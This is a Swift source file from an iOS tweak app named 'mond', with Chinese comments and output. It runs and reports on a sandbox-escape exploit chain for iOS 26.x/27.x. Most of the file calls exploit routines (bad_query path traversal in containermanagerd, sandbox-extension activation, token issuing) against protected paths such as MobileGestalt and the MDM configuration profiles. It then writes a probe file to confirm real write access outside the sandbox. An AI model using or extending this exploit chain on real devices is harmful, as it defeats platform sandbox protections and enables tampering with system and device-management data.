//
//  diagnostics.swift
//  mond
//
//  Comprehensive exploit chain diagnostics for iOS 26.x/27.x.
//  Outputs detailed results to stdout for LogView capture.
//

import Foundation
import Darwin
import UIKit
import XPC

// MARK: - System Info

func diag_system_info() {
    let v = ProcessInfo.processInfo.operatingSystemVersion
    let vString = ProcessInfo.processInfo.operatingSystemVersionString
    
    var sys = utsname()
    uname(&sys)
    let machine = Mirror(reflecting: sys.machine).children.reduce("") { id, el in
        guard let val = el.value as? Int8, val != 0 else { return id }
        return id + String(UnicodeScalar(UInt8(val)))
    }
    let release = Mirror(reflecting: sys.release).children.reduce("") { id, el in
        guard let val = el.value as? Int8, val != 0 else { return id }
        return id + String(UnicodeScalar(UInt8(val)))
    }
    let sysname = Mirror(reflecting: sys.sysname).children.reduce("") { id, el in
        guard let val = el.value as? Int8, val != 0 else { return id }
        return id + String(UnicodeScalar(UInt8(val)))
    }
    let version = Mirror(reflecting: sys.version).children.reduce("") { id, el in
        guard let val = el.value as? Int8, val != 0 else { return id }
        return id + String(UnicodeScalar(UInt8(val)))
    }
    
    print("")
    print("╔══════════════════════════════════════════════════════╗")
    print("║          MOND 诊断报告 — 漏洞链全面检测             ║")
    print("╚══════════════════════════════════════════════════════╝")
    print("")
    print("── 1. 系统与运行环境 ────────────────────────────────")
    print("  iOS 版本: \(v.majorVersion).\(v.minorVersion).\(v.patchVersion)")
    print("  系统描述: \(vString)")
    print("  设备型号: \(machine)")
    print("  内核版本: \(sysname) \(release)")
    print("  内核构建: \(version)")
    print("  界面模式: \(UIDevice.current.userInterfaceIdiom == .pad ? "iPad" : "iPhone")")
    print("  越狱环境: \(is_jailbroken() ? "✅ 检测到越狱环境" : "❌ 未检测到越狱环境")")
    print("  调试器附加: \(is_debugged() ? "是" : "否")")
    print("  进程 PID: \(getpid())")
    print("  进程 UID: \(getuid())")
    print("  is_supported(): \(is_supported())")
    print("")
}

// MARK: - MCM Symbol Resolution

func diag_mcm_symbols() {
    print("── 2. MCM 核心符号解析 (libsystem_containermanager.dylib) ──")
    
    guard let lib = dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW) else {
        print("  ❌ dlopen 失败: \(String(cString: dlerror()))")
        return
    }
    defer { dlclose(lib) }
    print("  ✅ dlopen 成功")
    
    let symbols = [
        "container_query_create",
        "container_query_free",
        "container_query_set_class",
        "container_query_set_transient",
        "container_query_set_group_identifiers",
        "container_query_operation_set_platform",
        "container_query_operation_set_flags",
        "container_query_operation_set_part",
        "container_query_operation_set_part_domain",
        "container_query_get_single_result",
        "container_copy_sandbox_token",
        "container_object_sandbox_extension_activate",
        "container_object_get_path",
        "container_object_get_sandbox_token",
    ]
    
    var resolved = 0
    var missing = 0
    for sym in symbols {
        let ptr = dlsym(lib, sym)
        let status = ptr != nil ? "✅" : "❌"
        if ptr != nil { resolved += 1 } else { missing += 1 }
        print("  \(status) \(sym): \(ptr.map { String(format: "%p", Int(bitPattern: $0)) } ?? "NULL")")
    }
    print("  合计: \(resolved) 已解析, \(missing) 缺失")
    
    // Also check sandbox symbols
    print("")
    print("── 3. 沙盒扩展符号 (libsystem_sandbox.dylib) ──")
    let sbxSymbols = [
        "sandbox_extension_consume",
        "sandbox_extension_release",
        "sandbox_extension_issue_file",
    ]
    for sym in sbxSymbols {
        let ptr = dlsym(RTLD_DEFAULT, sym)
        print("  \(ptr != nil ? "✅" : "❌") \(sym): \(ptr.map { String(format: "%p", Int(bitPattern: $0)) } ?? "NULL")")
    }
    print("")
}

// MARK: - Path Accessibility

func diag_path_access() {
    print("── 4. 目标路径可达性与权限测试 ─────────────────────")
    
    let targets: [(String, String)] = [
        ("MobileGestalt 缓存目录", TweakPaths.gestalt_dir),
        ("MobileGestalt plist", TweakPaths.gestalt),
        ("MDM 描述文件目录", TweakPaths.mdm_profiles),
        ("PosterBoard 目录", TweakPaths.posterboard),
        ("Preferences 目录", TweakPaths.preferences),
        ("/private/var (根)", "/private/var"),
        ("/private/var/mobile", "/private/var/mobile"),
        ("/private/var/containers", "/private/var/containers"),
    ]
    
    for (name, path) in targets {
        var line = "  \(name) (\(path)):\n"
        
        // lstat check
        var st = stat()
        let lstatResult = lstat(path, &st)
        if lstatResult == 0 {
            let typeStr: String
            switch st.st_mode & S_IFMT {
            case UInt16(S_IFDIR): typeStr = "目录"
            case UInt16(S_IFREG): typeStr = "文件 (\(st.st_size) bytes)"
            case UInt16(S_IFLNK): typeStr = "符号链接"
            default: typeStr = "其他 (mode=\(String(format: "0o%o", st.st_mode)))"
            }
            line += "    lstat: ✅ \(typeStr), uid=\(st.st_uid), gid=\(st.st_gid), perm=\(String(format: "%o", st.st_mode & 0o7777))\n"
        } else {
            line += "    lstat: ❌ errno=\(errno) (\(String(cString: strerror(errno))))\n"
        }
        
        // access() checks
        line += "    access(R_OK): \(access(path, R_OK) == 0 ? "✅" : "❌ (\(String(cString: strerror(errno))))")"
        line += "  access(W_OK): \(access(path, W_OK) == 0 ? "✅" : "❌")\n"
        
        // opendir check (for directories)
        if lstatResult == 0 && (st.st_mode & S_IFMT) == UInt16(S_IFDIR) {
            if let dir = opendir(path) {
                var count = 0
                while readdir(dir) != nil { count += 1 }
                closedir(dir)
                line += "    opendir: ✅ 成功枚举 (\(count) 个条目)\n"
            } else {
                line += "    opendir: ❌ errno=\(errno) (\(String(cString: strerror(errno))))\n"
            }
        }
        
        // Darwin.open check
        let fd = path.withCString { Darwin.open($0, O_RDONLY | O_CLOEXEC) }
        if fd >= 0 {
            line += "    Darwin.open(RDONLY): ✅ fd=\(fd)\n"
            Darwin.close(fd)
        } else {
            line += "    Darwin.open(RDONLY): ❌ errno=\(errno) (\(String(cString: strerror(errno))))\n"
        }
        
        print(line)
    }
}

// MARK: - Exploit Method Testing

func diag_exploit_methods() {
    print("── 5. 漏洞利用方法逐项实测 ─────────────────────────")
    print("")
    
    // Test 1: bad_query for MobileGestalt
    print("  [测试 1] bad_query → MobileGestalt 缓存目录")
    print("    目标: \(TweakPaths.gestalt_dir)")
    var path_mg = TweakPaths.gestalt_dir.utf8CString.map { Int8($0) }
    let h1 = bad_query(&path_mg, false, nil, false)
    print("    结果: handle=\(h1) \(h1 >= 0 ? "✅ 成功获得沙盒扩展句柄" : "❌ 失败")")
    diag_interpret_bad_query_code(h1)
    if h1 >= 0 { bad_query_release(h1) }
    print("")
    
    // Test 2: bad_query for MDM with auto-detect
    print("  [测试 2] bad_query → MDM ConfigurationProfiles (自动识别 SystemGroup)")
    print("    目标: \(TweakPaths.mdm_profiles_dir)")
    var path_mdm = TweakPaths.mdm_profiles_dir.utf8CString.map { Int8($0) }
    let h2 = bad_query(&path_mdm, false, nil, false)
    print("    结果: handle=\(h2) \(h2 >= 0 ? "✅ 成功获得沙盒扩展句柄" : "❌ 失败")")
    diag_interpret_bad_query_code(h2)
    if h2 >= 0 { bad_query_release(h2) }
    print("")
    
    // Test 3: bad_query for MDM with mobilegestaltcache redirect
    print("  [测试 3] bad_query → MDM (借助 mobilegestaltcache 锚点重定向)")
    var path_mdm2 = TweakPaths.mdm_profiles_dir.utf8CString.map { Int8($0) }
    var mg_id = "systemgroup.com.apple.mobilegestaltcache".utf8CString.map { Int8($0) }
    let h3 = bad_query(&path_mdm2, false, &mg_id, true)
    print("    结果: handle=\(h3) \(h3 >= 0 ? "✅ 成功获得沙盒扩展句柄" : "❌ 失败")")
    diag_interpret_bad_query_code(h3)
    if h3 >= 0 { bad_query_release(h3) }
    print("")
    
    // Test 4: cmg-activate for MDM
    print("  [测试 4] cmg-activate → MDM (container_object_sandbox_extension_activate)")
    if let path = grant_mdm_access() {
        print("    结果: ✅ 成功激活, 路径=\(path)")
    } else {
        print("    结果: ❌ 所有 activate 策略失败")
    }
    print("")
    
    // Test 5: UUID path resolution
    print("  [测试 5] UUID 路径解析 → configurationprofiles 真实 UUID")
    if let uuidPath = resolve_mdm_uuid_path() {
        print("    结果: ✅ 成功解析物理 UUID 路径=\(uuidPath)")
        
        // Try bad_query with UUID path
        let uuidTarget = uuidPath.hasSuffix("/")
            ? uuidPath + "Library/ConfigurationProfiles/"
            : uuidPath + "/Library/ConfigurationProfiles/"
        print("    穿越目标: \(uuidTarget)")
        
        var uuid_c = uuidTarget.utf8CString.map { Int8($0) }
        var mg_c2 = "systemgroup.com.apple.mobilegestaltcache".utf8CString.map { Int8($0) }
        let h5 = bad_query(&uuid_c, false, &mg_c2, true)
        print("    bad_query(UUID路径): handle=\(h5) \(h5 >= 0 ? "✅ 成功获得沙盒扩展" : "❌ 失败")")
        diag_interpret_bad_query_code(h5)
        if h5 >= 0 { bad_query_release(h5) }
    } else {
        print("    结果: ❌ container_object_get_path 返回 NULL")
    }
    print("")
    
    // Test 6: sandbox_extension_issue_file
    print("  [测试 6] sandbox_extension_issue_file (直接签发，用于 TrollStore/免沙盒测试)")
    let testPaths = [
        ("MobileGestalt", TweakPaths.gestalt_dir),
        ("MDM", TweakPaths.mdm_profiles_dir),
    ]
    for (name, path) in testPaths {
        if let token = sandbox_extension_issue_file(path: path) {
            print("    \(name): ✅ 获得 token (长度=\(token.count))")
            if let h = sandbox_extension_consume(token), h >= 0 {
                print("    \(name): ✅ consume 成功 handle=\(h)")
            } else {
                print("    \(name): ❌ consume 失败")
            }
        } else {
            print("    \(name): ❌ issue_file 返回 NULL (需要 no-sandbox entitlement 或 TrollStore)")
        }
    }
    print("")
    
    // Test 7: Jailbreak unsandbox
    print("  [测试 7] 越狱环境运行时脱沙盒 (jailbreak_unsandbox)")
    if let method = jailbreak_unsandbox() {
        print("    结果: ✅ 成功脱沙盒, 方式=\(method)")
    } else {
        print("    结果: ❌ 无可用越狱脱沙盒环境")
    }
    print("")
    
    // Test 8: CMG (cmg.swift exploit)
    print("  [测试 8] cmg() → MobileGestalt (container_object_sandbox_extension_activate)")
    let h8 = cmg()
    print("    结果: fd=\(h8) \(h8 >= 0 ? "✅ 成功" : "❌ 失败")")
    print("")
    
    // Test 9: Additional system directory tests
    print("  [测试 9] 其他典型系统目录 bad_query 可达性")
    let extraTargets: [(String, String)] = [
        ("系统数据容器 (Data/System)", "/private/var/containers/Data/System/"),
        ("应用数据容器 (Data/Application)", "/private/var/mobile/Containers/Data/Application/"),
        ("PosterBoard 锁屏海报", TweakPaths.posterboard_dir),
        ("Preferences 偏好设置", TweakPaths.preferences_dir),
    ]
    for (name, path) in extraTargets {
        var p = path.utf8CString.map { Int8($0) }
        let h = bad_query(&p, false, nil, false)
        print("    \(name) (\(path)): handle=\(h) \(h >= 0 ? "✅ 可达" : "❌ 拒绝")")
        if h >= 0 { bad_query_release(h) }
    }
    print("")
}

// MARK: - Post-Escape Verification

func diag_post_escape_verify() {
    print("── 6. 逃逸后真实读写能力验证 ───────────────────────")
    
    let handle = grant_mg_write()
    print("  grant_mg_write() 结果句柄: \(handle) \(handle >= 0 ? "✅" : "❌")")
    
    if handle >= 0 {
        // Verify MobileGestalt read
        let gestaltPath = TweakPaths.gestalt
        let rfd = gestaltPath.withCString { Darwin.open($0, O_RDONLY | O_CLOEXEC) }
        if rfd >= 0 {
            var buf = [UInt8](repeating: 0, count: 16)
            let n = Darwin.read(rfd, &buf, buf.count)
            Darwin.close(rfd)
            print("  MobileGestalt 读取: ✅ 成功 (前\(n)字节: \(buf.prefix(min(8, max(0, n))).map { String(format: "%02x", $0) }.joined(separator: " ")))")
        } else {
            print("  MobileGestalt 读取: ❌ open 失败 errno=\(errno) (\(String(cString: strerror(errno))))")
        }
        
        // Verify write probe
        let probeDir = URL(fileURLWithPath: TweakPaths.gestalt_dir)
        let probePath = probeDir.appendingPathComponent(".mond-diag-probe-\(UUID().uuidString)").path
        let probeData = Data("mond-diag-probe".utf8)
        let wfd = probePath.withCString { Darwin.open($0, O_WRONLY | O_CREAT | O_EXCL | O_CLOEXEC, 0o644) }
        if wfd >= 0 {
            let ok = probeData.withUnsafeBytes { ptr in
                Darwin.write(wfd, ptr.baseAddress!, probeData.count) == probeData.count
            }
            Darwin.close(wfd)
            unlink(probePath)
            print("  MobileGestalt 写入探针: \(ok ? "✅ 真实写入+删除成功！沙盒逃逸完全生效！" : "❌ 写入字节数不匹配")")
        } else {
            print("  MobileGestalt 写入探针: ❌ open(CREAT) 失败 errno=\(errno) (\(String(cString: strerror(errno))))")
        }
    } else {
        print("  ❌ grant_mg_write 失败，跳过写入探针。")
    }
    print("")
}

// MARK: - Helper

private func diag_interpret_bad_query_code(_ code: Int64) {
    switch code {
    case let c where c >= 0:
        print("    → 解释: sandbox_extension_consume 成功, handle=\(c)")
    case -1:
        print("    → 解释: 无法加载或解析 libsystem_containermanager 核心符号")
    case -2:
        print("    → 解释: container_query_create() 返回 NULL")
    case -3:
        print("    → 解释: [错误 -3] containermanagerd 拒绝查询结果 (MCM 路径穿越在此系统可能已被修补)")
    case -4:
        print("    → 解释: [错误 -4] copy_sandbox_token 返回 NULL (内核拒绝签发 Token / 内核黑名单保护)")
    case -5:
        print("    → 解释: asprintf 路径穿越字符串构造失败")
    case -254:
        print("    → 解释: lstat() 失败: 目标路径在当前设备文件系统中不存在")
    case -255:
        print("    → 解释: 提供的路径非法或不是绝对路径")
    default:
        print("    → 解释: 未知错误码 (\(code))")
    }
}

// MARK: - Main Entry

func run_full_diagnostics() {
    diag_system_info()
    diag_mcm_symbols()
    diag_path_access()
    diag_exploit_methods()
    diag_post_escape_verify()
    
    print("╔══════════════════════════════════════════════════════╗")
    print("║          诊断完成 — 请长按复制日志发送给开发者         ║")
    print("╚══════════════════════════════════════════════════════╝")
    print("")
}
